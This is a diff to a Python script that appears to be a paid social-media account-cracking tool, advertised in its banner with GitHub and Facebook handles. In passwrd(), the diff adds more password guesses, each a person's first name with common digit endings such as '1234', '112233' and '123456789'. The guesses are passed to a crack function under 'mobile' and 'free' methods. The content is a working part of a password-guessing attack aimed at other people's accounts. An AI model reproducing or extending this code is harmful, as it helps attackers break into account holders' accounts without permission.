@@ -107,7 +107,7 @@ def banner():
  
  
 \33[1;34m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
-\33[1;34m█  \33[mGithub: https://github.com/\33[1;32 ahmadfatah99
+\33[1;34m█  \33[mGithub: https://github.com/\33[1;32ahmadfatah99
 \33[1;34m█  \33[mFacebook: \33[1;32afmerror69
 \33[1;34m█  \33[mWhatsApp: \33[1;32m+-----------
 \33[1;34m█  \33[mTools : \33[1;32mPAID
@@ -567,14 +567,30 @@ def passwrd():
 					pass
 				else:
 					pwv.append(frs+'123')
+					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
+					pwv.append(frs+'123456')
+					pwv.append(frs+'1122')
+					pwv.append(frs+'1212')
+					pwv.append(frs+'112233')
+					pwv.append(frs+'12345678')
+					pwv.append(frs+'123456789')
+					pwv.append(frs+'123321')
 			else:
 				if len(frs)<3:
 					pwv.append(nmf)
 				else:
 					pwv.append(nmf)
 					pwv.append(frs+'123')
+					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
+					pwv.append(frs+'123456')
+					pwv.append(frs+'1122')
+					pwv.append(frs+'1212')
+					pwv.append(frs+'112233')
+					pwv.append(frs+'12345678')
+					pwv.append(frs+'123456789')
+					pwv.append(frs+'123321')
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
 			elif 'free' in method:
